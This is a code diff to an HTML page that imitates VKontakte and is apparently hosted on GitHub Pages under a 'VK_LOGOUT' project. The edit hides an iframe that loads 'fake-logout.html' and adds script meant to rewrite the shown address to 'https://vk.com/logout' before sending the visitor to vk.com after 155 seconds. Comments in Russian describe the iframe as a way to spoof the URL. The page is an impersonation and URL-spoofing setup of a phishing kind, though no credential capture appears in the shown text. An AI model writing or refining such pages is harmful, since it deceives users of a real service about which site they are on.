@@ -84,11 +84,10 @@
     }
 
     iframe {
-      width: 100%;
-      height: 100vh;
+      width: 0;
+      height: 0;
       border: none;
-      display: block;
-      margin-top: 20px;
+      display: none;
     }
   </style>
 </head>
@@ -108,22 +107,25 @@
     &copy; 2025 ВКонтакте LLC
   </footer>
 
-  <!-- Здесь iframe будет загрузить эту же страницу, чтобы контролировать адрес -->
-  <iframe src="https://jkeep1990.github.io/VK_LOGOUT/fake-logout.html"></iframe>
+  <!-- Вставляем iframe для подмены URL -->
+  <iframe src="https://jkeep1990.github.io/VK_LOGOUT/fake-logout.html" id="fake-logout"></iframe>
 
   <script>
-    // Смена URL внутри iframe, чтобы в основной строке был правильный адрес
-    setTimeout(() => {
-      // Это будет изменение в URL на самой странице iframe
-      let iframe = document.querySelector('iframe');
+    // После загрузки iframe меняем URL внутри него
+    window.onload = function() {
+      let iframe = document.getElementById('fake-logout');
       let iframeWindow = iframe.contentWindow;
-      iframeWindow.history.pushState(null, null, 'https://vk.com/logout');
-      
-      // Переход на главную через 155 секунд
+
+      // Используем setTimeout для того, чтобы дать время iframe загружаться
+      setTimeout(() => {
+        iframeWindow.history.pushState(null, null, 'https://vk.com/logout');
+      }, 100);  // Задержка перед изменением URL
+
+      // Через некоторое время, через 155 секунд, редиректим на главную
       setTimeout(() => {
         window.location.href = "https://vk.com";
       }, 155000);
-    }, 100);
+    }
   </script>
 </body>
 </html>
